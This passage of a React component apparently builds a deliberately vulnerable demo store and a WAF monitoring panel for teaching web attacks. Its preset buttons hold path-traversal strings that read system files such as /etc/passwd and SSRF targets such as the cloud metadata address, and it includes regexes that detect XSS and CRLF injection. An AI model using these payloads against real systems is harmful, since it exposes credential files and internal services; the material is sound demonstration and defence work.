                                  className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20"
                                >
                                  {p}
                                </button>
                              ))}
                            </div>
                          </div>

                          <Button
                            size="sm"
                            onClick={() => handlePingExecute(pingHost)}
                            className="w-full h-8 text-xs font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 hover:bg-emerald-500/30 mt-2"
                          >
                            Execute Ping
                          </Button>
                        </div>

                        {/* 2. System Report Viewer (Path Traversal / LFI) */}
                        <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3 flex flex-col justify-between">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <FileCode className="size-4 text-cyan-400" />
                              <h3 className="text-xs font-bold text-foreground uppercase">2. Report File Viewer</h3>
                            </div>
                            <p className="text-[10px] text-muted-foreground">
                              Downloads log files by relative path. Vulnerable to Path Traversal.
                            </p>
                            <Input
                              value={traversalPath}
                              onChange={(e) => setTraversalPath(e.target.value)}
                              className="mt-2 h-8 font-mono text-xs bg-background/80"
                              placeholder="../../../../etc/passwd"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["../../../../etc/passwd", "..\\..\\windows\\win.ini", "../../db.conf"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handleTraversalExecute(p)}
                                  className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20"
                                >
                                  {p}
                                </button>
                              ))}
                            </div>
                          </div>

                          <Button
                            size="sm"
                            onClick={() => handleTraversalExecute(traversalPath)}
                            className="w-full h-8 text-xs font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 hover:bg-cyan-500/30 mt-2"
                          >
                            Fetch Report File
                          </Button>
                        </div>

                        {/* 3. Webhook Verifier (SSRF) */}
                        <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3 flex flex-col justify-between">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <Globe2 className="size-4 text-violet-400" />
                              <h3 className="text-xs font-bold text-foreground uppercase">3. Webhook URL Tester</h3>
                            </div>
                            <p className="text-[10px] text-muted-foreground">
                              Backend fetches URL callback. Vulnerable to SSRF (Cloud Metadata).
                            </p>
                            <Input
                              value={webhookUrl}
                              onChange={(e) => setWebhookUrl(e.target.value)}
                              className="mt-2 h-8 font-mono text-xs bg-background/80"
                              placeholder="http://169.254.169.254/..."
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {[
                                "http://169.254.169.254/latest/meta-data/",
                                "http://127.0.0.1:8080/admin",
                                "http://localhost:6379/",
                              ].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handleWebhookExecute(p)}
                                  className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20"
                                >
                                  {p.slice(0, 22)}...
                                </button>
                              ))}
                            </div>
                          </div>

                          <Button
                            size="sm"
                            onClick={() => handleWebhookExecute(webhookUrl)}
                            className="w-full h-8 text-xs font-bold bg-violet-500/20 text-violet-300 border border-violet-500/30 hover:bg-violet-500/30 mt-2"
                          >
                            Verify Webhook URL
                          </Button>
                        </div>
                      </div>

                      {/* Diagnostic Outputs Terminal Box */}
                      {(pingOutput || traversalOutput || webhookOutput) && (
                        <div className="rounded-2xl border border-border/60 bg-[#090d16] p-4 font-mono text-xs shadow-xl space-y-2">
                          <div className="flex items-center justify-between border-b border-border/40 pb-2">
                            <span className="text-cyan-400 font-bold flex items-center gap-1.5">
                              <Terminal className="size-3.5" /> Backend Server Standard Output
                            </span>
                            <button
                              type="button"
                              onClick={() => {
                                setPingOutput(null);
                                setTraversalOutput(null);
                                setWebhookOutput(null);
                              }}
                              className="text-muted-foreground hover:text-foreground text-[10px]"
                            >
                              Clear
                            </button>
                          </div>
                          {pingOutput && <pre className="text-emerald-400 whitespace-pre-wrap">{pingOutput}</pre>}
                          {traversalOutput && <pre className="text-cyan-300 whitespace-pre-wrap">{traversalOutput}</pre>}
                          {webhookOutput && <pre className="text-amber-300 whitespace-pre-wrap">{webhookOutput}</pre>}
                        </div>
                      )}
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 6: USER DASHBOARD
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "dashboard" && (
                    <div className="space-y-6">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <span className="text-4xl p-2 rounded-2xl bg-cyan-500/15 border border-cyan-500/30">
                            {currentUser?.avatar || "👤"}
                          </span>
                          <div>
                            <h2 className="text-lg font-bold text-foreground">
                              {currentUser ? currentUser.name : "Guest User"}
                            </h2>
                            <p className="text-xs text-muted-foreground">
                              {currentUser?.role || "Visitor"} · {currentUser?.department || "External"}
                            </p>
                          </div>
                        </div>

                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => navigateTo("tools")}
                          className="h-8 text-xs font-semibold rounded-xl"
                        >
                          <Wrench className="size-3.5 mr-1" /> Dev Tools
                        </Button>
                      </div>

                      {/* Stats Grid */}
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                        {[
                          { label: "Security Posture", value: "98/100", icon: <ShieldCheck className="size-4 text-emerald-400" /> },
                          { label: "Active Tokens", value: "3 Hardware Keys", icon: <Key className="size-4 text-cyan-400" /> },
                          { label: "SOC Requests (24h)", value: "18,492", icon: <TrendingUp className="size-4 text-violet-400" /> },
                          { label: "Threats Blocked", value: "349 Attacks", icon: <Shield className="size-4 text-amber-400" /> },
                        ].map((stat, idx) => (
                          <div key={idx} className="rounded-2xl border border-border/50 bg-card/60 p-3.5 space-y-1">
                            <div className="flex items-center justify-between">
                              <span className="text-[10px] text-muted-foreground font-medium">{stat.label}</span>
                              {stat.icon}
                            </div>
                            <p className="font-mono font-bold text-base text-foreground">{stat.value}</p>
                          </div>
                        ))}
                      </div>

                      {/* User Secret Keys & Settings */}
                      <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3">
                        <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
                          Assigned API Credentials & Environment Secrets
                        </h3>
                        <div className="rounded-xl bg-muted/30 border border-border/40 p-3 font-mono text-xs flex justify-between items-center">
                          <div>
                            <p className="text-[10px] text-muted-foreground">API Master Key:</p>
                            <p className="text-cyan-300 font-bold">{currentUser?.apiKeys || "sk_live_public_demo_guest"}</p>
                          </div>
                          <Button
                            size="sm"
                            variant="ghost"
                            onClick={() => toast.success("API key copied to clipboard")}
                            className="h-7 text-xs"
                          >
                            <Copy className="size-3" />
                          </Button>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 7: RESTRICTED ADMIN CONSOLE (ACCESSIBLE VIA SQLI / PRIV ESC)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "admin" && (
                    <div className="space-y-6">
                      <div className="rounded-2xl border border-amber-500/40 bg-amber-500/[0.06] p-5">
                        <div className="flex items-center gap-3">
                          <span className="text-3xl">👑</span>
                          <div>
                            <h2 className="text-base font-extrabold text-amber-300">
                              Restricted Executive Admin Console
                            </h2>
                            <p className="text-xs text-muted-foreground">
                              Confidential database tables, encryption keys, and system user management.
                            </p>
                          </div>
                        </div>
                      </div>

                      {/* User Database Table */}
                      <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3">
                        <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
                          Internal User Accounts & Password Hashes
                        </h3>
                        <div className="overflow-x-auto">
                          <table className="w-full text-left text-xs">
                            <thead>
                              <tr className="border-b border-border/40 text-muted-foreground text-[10px] uppercase font-bold">
                                <th className="py-2">User</th>
                                <th className="py-2">Email</th>
                                <th className="py-2">Role</th>
                                <th className="py-2">API Secret</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-border/20 font-mono text-[11px]">
                              {FAKE_USERS.map((u, i) => (
                                <tr key={i} className="hover:bg-muted/30">
                                  <td className="py-2 font-bold text-foreground">
                                    {u.avatar} {u.username}
                                  </td>
                                  <td className="py-2 text-muted-foreground">{u.email}</td>
                                  <td className="py-2 text-cyan-300">{u.role}</td>
                                  <td className="py-2 text-amber-300">{u.apiKeys}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 8: SUPPORT DESK & TICKET CONTACT (STORED XSS / CRLF)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "contact" && (
                    <div className="max-w-xl mx-auto space-y-6 py-2">
                      <div className="text-center space-y-1">
                        <h2 className="text-lg font-bold text-foreground">Submit Security Support Ticket</h2>
                        <p className="text-xs text-muted-foreground">
                          Contact our 24/7 Security Operations Center team
                        </p>
                      </div>

                      <form
                        onSubmit={(e) => {
                          e.preventDefault();
                          const isXss = /<script|onerror|onload|<img/i.test(contactName + contactMessage);
                          const isCrlf = /%0a|%0d|bcc:|subject:/i.test(contactEmail);
                          executeRequest(
                            `name=${encodeURIComponent(contactName)}&email=${encodeURIComponent(
                              contactEmail
                            )}&subject=${encodeURIComponent(contactSubject)}&message=${encodeURIComponent(
                              contactMessage
                            )}`,
                            "message",
                            "POST",
                            "/api/support/tickets",
                            isXss ? "stored-xss" : isCrlf ? "email-injection" : undefined
                          );
                        }}
                        className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3.5 shadow-xl"
                      >
                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <label className="block text-[11px] font-bold text-foreground/80 mb-1">Your Name</label>
                            <Input
                              value={contactName}
                              onChange={(e) => setContactName(e.target.value)}
                              className="h-9 text-xs font-mono bg-background/80"
                            />
                          </div>
                          <div>
                            <label className="block text-[11px] font-bold text-foreground/80 mb-1">
                              Email Address (CRLF Vector)
                            </label>
                            <Input
                              value={contactEmail}
                              onChange={(e) => setContactEmail(e.target.value)}
                              className="h-9 text-xs font-mono bg-background/80"
                            />
                          </div>
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">Subject</label>
                          <Input
                            value={contactSubject}
                            onChange={(e) => setContactSubject(e.target.value)}
                            className="h-9 text-xs bg-background/80"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-foreground/80 mb-1">
                            Message Body (Stored XSS Vector)
                          </label>
                          <Textarea
                            value={contactMessage}
                            onChange={(e) => setContactMessage(e.target.value)}
                            className="min-h-24 text-xs font-mono bg-background/80 resize-none"
                          />
                        </div>

                        <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-500 text-black hover:bg-cyan-400">
                          Submit Support Ticket →
                        </Button>
                      </form>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 9: KNOWLEDGE BASE / SEARCH (REFLECTED XSS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "search" && (
                    <div className="space-y-6">
                      <div className="text-center space-y-1.5 max-w-md mx-auto">
                        <h2 className="text-lg font-bold text-foreground">Knowledge Base & Threat Docs</h2>
                        <p className="text-xs text-muted-foreground">Search across security guidelines and articles</p>
                        <Input
                          value={searchQuery}
                          onChange={(e) => handleStoreSearch(e.target.value)}
                          placeholder="Search docs or enter Reflected XSS payload..."
                          className="h-9 font-mono text-xs bg-muted/40"
                        />
                      </div>

                      <div className="space-y-3">
                        {DOC_ARTICLES.map((doc) => (
                          <div key={doc.id} className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-1">
                            <div className="flex justify-between items-center">
                              <h3 className="text-xs font-bold text-cyan-400">{doc.title}</h3>
                              <span className="rounded bg-muted px-2 py-0.5 text-[9px] font-semibold text-muted-foreground">
                                {doc.category}
                              </span>
                            </div>
                            <p className="text-xs text-muted-foreground">{doc.snippet}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>

            {/* In-Browser Footer */}
            <div className="border-t border-border/40 bg-muted/30 px-5 py-2.5 flex items-center justify-between text-[10px] text-muted-foreground">
              <span>© 2026 Apex CyberStore Systems · Protected by WebGuard AI WAF</span>
              <span className="flex items-center gap-1 font-mono">
                Engine: <span className="text-cyan-400 font-bold">FastAPI Proxy (Port 8000)</span>
              </span>
            </div>
          </div>
        </div>

        {/* ═══════════════════════════════════════════════════════════════════
            RIGHT: Live Traffic, Raw Terminal & Threat Analysis Panel
        ════════════════════════════════════════════════════════════════════ */}
        <div className="xl:col-span-5 flex flex-col gap-3">
          {/* Tab Selector */}
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-1.5">
              {[
                { id: "visual" as const, label: "Live Traffic", icon: <Globe2 className="size-3.5" /> },
                { id: "http" as const, label: "HTTP Terminal", icon: <Terminal className="size-3.5" /> },
                { id: "analysis" as const, label: "Attack Triage", icon: <Bug className="size-3.5" /> },
              ].map((t) => (
                <button
                  key={t.id}
                  type="button"
                  onClick={() => setResponseTab(t.id)}
                  className={cn(
                    "flex items-center gap-1.5 rounded-xl border px-3 py-1.5 text-xs font-bold transition-all",
                    responseTab === t.id
                      ? "border-cyan-500/50 bg-cyan-500/15 text-cyan-400 shadow-sm"
                      : "border-border/40 text-muted-foreground hover:text-foreground hover:bg-muted/40"
                  )}
                >
                  {t.icon} {t.label}
                </button>
              ))}
            </div>

            <Button
              variant="ghost"
              size="sm"
              className="h-7 text-[10px] text-muted-foreground hover:text-foreground"
              onClick={() => {
                setLogs([]);
                setLastResult(null);
                setActiveExploitDisplay(null);
              }}
            >
              <RefreshCw className="size-3 mr-1" /> Clear Stream
            </Button>
          </div>

          {/* Tab 1: Live Traffic Log */}
          {responseTab === "visual" && (
            <div className="wg-panel flex min-h-[520px] max-h-[720px] flex-col overflow-hidden p-0 rounded-2xl border border-border/60 bg-card">
              <div className="flex items-center justify-between border-b border-border/40 bg-muted/40 px-4 py-2.5">
                <span className="text-xs font-bold text-foreground flex items-center gap-1.5">
                  <Globe2 className="size-4 text-cyan-400" /> Intercepted HTTP Exchanges ({logs.length / 2})
                </span>
                <span className="text-[10px] text-muted-foreground font-mono">Edge Pipeline</span>
              </div>

              <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
                {logs.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-24 text-center gap-2">
                    <Globe2 className="size-10 text-muted-foreground/30" />
                    <p className="text-xs font-semibold text-muted-foreground">Waiting for website traffic...</p>
                    <p className="text-[10px] text-muted-foreground/70 max-w-xs">
                      Interact with the store on the left (search, review, ping, IDOR order lookup) to see real-time
                      packet inspection.
                    </p>
                  </div>
                ) : (
                  logs.map((log) => (
                    <div
                      key={log.id}
                      className={cn(
                        "rounded-xl border p-3 text-xs space-y-2 transition-all",
                        log.type === "request"
                          ? "border-cyan-500/30 bg-cyan-500/[0.03]"
                          : log.type === "waf"
                          ? "border-emerald-500/40 bg-emerald-500/[0.05]"
                          : "border-red-500/30 bg-red-500/[0.04]"
                      )}
                    >
                      <div className="flex items-center gap-2">
                        <span
                          className={cn(
                            "rounded px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wider",
                            log.type === "request"
                              ? "bg-cyan-500/20 text-cyan-400"
                              : log.type === "waf"
                              ? "bg-emerald-500/20 text-emerald-400"
                              : "bg-red-500/20 text-red-400"
                          )}
                        >
                          {log.type === "request" ? "→ INGRESS" : log.type === "waf" ? "🛡️ WAF 403" : "← EGRESS"}
                        </span>
                        {log.method && (
                          <span className="font-mono text-[10px] font-bold text-foreground">{log.method}</span>
                        )}
                        {log.path && <span className="font-mono text-[10px] text-muted-foreground truncate">{log.path}</span>}
                        {log.threatScore !== undefined && (
                          <span
                            className={cn(
                              "ml-auto font-mono text-[9px] font-bold px-1.5 py-0.5 rounded",
                              log.threatScore > 70
                                ? "bg-red-500/20 text-red-400"
                                : log.threatScore > 30
                                ? "bg-amber-500/20 text-amber-400"
                                : "bg-emerald-500/20 text-emerald-400"
                            )}
                          >
                            Score: {log.threatScore}/100
                          </span>
                        )}
                      </div>

                      {log.body && (
                        <pre className="max-h-20 overflow-x-auto rounded bg-black/40 p-2 font-mono text-[10px] text-foreground/75 whitespace-pre-wrap">
                          {log.body}
                        </pre>
                      )}

                      {log.vulnId && VULN_DEFS[log.vulnId] && (
                        <div className="flex items-center justify-between border-t border-border/30 pt-1.5 text-[10px]">
                          <span className="text-muted-foreground font-semibold">
                            CWE: {VULN_DEFS[log.vulnId].cwe} · {VULN_DEFS[log.vulnId].label}
                          </span>
                          <span
                            className={cn(
                              "rounded-full px-2 py-0.2 text-[8px] font-bold",
                              SEVERITY_META[VULN_DEFS[log.vulnId].severity].badge
                            )}
                          >
                            {SEVERITY_META[VULN_DEFS[log.vulnId].severity].label}
                          </span>
                        </div>
                      )}
                    </div>
                  ))
                )}
                <div ref={logsEndRef} />
              </div>
            </div>
          )}

          {/* Tab 2: Raw HTTP Terminal Stream */}
          {responseTab === "http" && (
            <div className="wg-panel flex min-h-[520px] max-h-[720px] flex-col overflow-hidden p-0 rounded-2xl border border-border/60 bg-[#070b12]">
              <div className="flex items-center justify-between border-b border-border/40 bg-muted/20 px-4 py-2.5">
                <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-1.5">
                  <Terminal className="size-3.5" /> Socket Stream Inspector
                </span>
                <span className="text-[10px] text-muted-foreground font-mono">HTTP/1.1 Edge</span>
              </div>

              <div className="flex-1 overflow-y-auto p-4 font-mono text-[11px] leading-relaxed text-foreground/80 space-y-4">
                {logs.length === 0 ? (
                  <span className="text-muted-foreground/40"># No packets logged yet.</span>
                ) : (
                  logs.map((log) => (
                    <div key={log.id} className="border-b border-border/20 pb-3">
                      <p className="text-[9px] text-muted-foreground/60 mb-1">
                        ─── {new Date(log.ts).toLocaleTimeString()} ───
                      </p>
                      {log.type === "request" && (
                        <>
                          <p className="text-cyan-400 font-bold">
                            → {log.method} {log.path} HTTP/1.1
                          </p>
                          <p className="text-muted-foreground">Host: apex-cyberstore.io</p>
                          <p className="text-muted-foreground">User-Agent: Mozilla/5.0 (Windows NT 10.0)</p>
                          {log.body && <p className="text-emerald-400 mt-1 font-semibold">{log.body}</p>}
                        </>
                      )}
                      {log.type === "waf" && (
                        <>
                          <p className="text-emerald-400 font-bold">← HTTP/1.1 403 Forbidden (WAF Intercept)</p>
                          <p className="text-muted-foreground">X-WebGuard-Rule: {log.vulnId?.toUpperCase()}</p>
                          <p className="text-muted-foreground">X-WebGuard-Action: BLOCKED_AT_EDGE</p>
                          <p className="text-emerald-300 mt-1">{log.body?.slice(0, 160)}...</p>
                        </>
                      )}
                      {log.type === "response" && (
                        <>
                          <p className="text-red-400 font-bold">← HTTP/1.1 {log.status} OK (Backend Response)</p>
                          <p className="text-muted-foreground">Server: Uvicorn/FastAPI (Port 8080)</p>
                          <p className="text-muted-foreground">Content-Type: application/json</p>
                          <p className="text-red-300 mt-1">{log.body?.slice(0, 160)}...</p>
                        </>
                      )}
                    </div>
                  ))
                )}
              </div>
            </div>
          )}

          {/* Tab 3: Attack Triage & Virtual Patching */}
          {responseTab === "analysis" && (
            <div className="wg-panel flex min-h-[520px] max-h-[720px] flex-col overflow-hidden p-4 rounded-2xl border border-border/60 bg-card space-y-4">
              <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground flex items-center gap-1.5">
                <Bug className="size-4 text-red-400" /> OWASP Threat Classification & Virtual Patch
              </h3>

              {!lastResult || !lastResult.vulnId ? (
                <div className="flex flex-col items-center justify-center py-20 text-center gap-2">
                  <Bug className="size-10 text-muted-foreground/30" />
                  <p className="text-xs text-muted-foreground">No recent exploit analyzed.</p>
                  <p className="text-[10px] text-muted-foreground/70">
                    Trigger an attack (SQLi, XSS, CMDi) from the store to inspect the vulnerability defense breakdown.
                  </p>
                </div>
              ) : (
                <div className="space-y-4 overflow-y-auto pr-1">
                  {/* Verdict Badge */}
                  <div
                    className={cn(
                      "rounded-2xl border-2 p-4 flex items-center gap-3",
                      lastResult.blocked
                        ? "border-emerald-500/50 bg-emerald-500/[0.08]"
                        : "border-red-500/50 bg-red-500/[0.08]"
                    )}
                  >
                    {lastResult.blocked ? (
                      <ShieldCheck className="size-8 text-emerald-400" />
                    ) : (
                      <ShieldAlert className="size-8 text-red-400" />
                    )}
                    <div>
                      <h4
                        className={cn(
                          "text-sm font-extrabold",
                          lastResult.blocked ? "text-emerald-400" : "text-red-400"
                        )}
                      >
                        {lastResult.blocked ? "🛡️ Attack Dropped by WebGuard Edge" : "⚠️ Vulnerability Exploited!"}
                      </h4>
                      <p className="text-xs text-muted-foreground">
                        {VULN_DEFS[lastResult.vulnId]?.label || "Custom Attack"}
                      </p>
                    </div>
                  </div>

                  {/* Vulnerability Meta */}
                  {VULN_DEFS[lastResult.vulnId] && (
                    <div className="rounded-2xl border border-border/50 bg-muted/20 p-4 space-y-2.5 text-xs">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-foreground">{VULN_DEFS[lastResult.vulnId].label}</span>
                        <span
                          className={cn(
                            "rounded-full px-2 py-0.5 text-[9px] font-bold",
                            SEVERITY_META[VULN_DEFS[lastResult.vulnId].severity].badge
                          )}
                        >
                          {SEVERITY_META[VULN_DEFS[lastResult.vulnId].severity].label}
                        </span>
                      </div>
                      <p className="text-muted-foreground text-[11px] leading-relaxed">
                        {VULN_DEFS[lastResult.vulnId].description}
                      </p>
                      <div className="flex gap-4 text-[10px] text-muted-foreground font-semibold">
                        <span>CWE: {VULN_DEFS[lastResult.vulnId].cwe}</span>
                        <span>OWASP: {VULN_DEFS[lastResult.vulnId].owasp}</span>
                      </div>

                      {/* Virtual Patch Box */}
                      <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/[0.05] p-3 space-y-1">
                        <p className="text-[10px] font-bold text-emerald-400 uppercase tracking-wider">
                          🛡️ WebGuard Virtual Patch Policy:
                        </p>
                        <p className="text-[11px] text-emerald-300 font-mono">
                          {VULN_DEFS[lastResult.vulnId].wafPatch}
                        </p>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
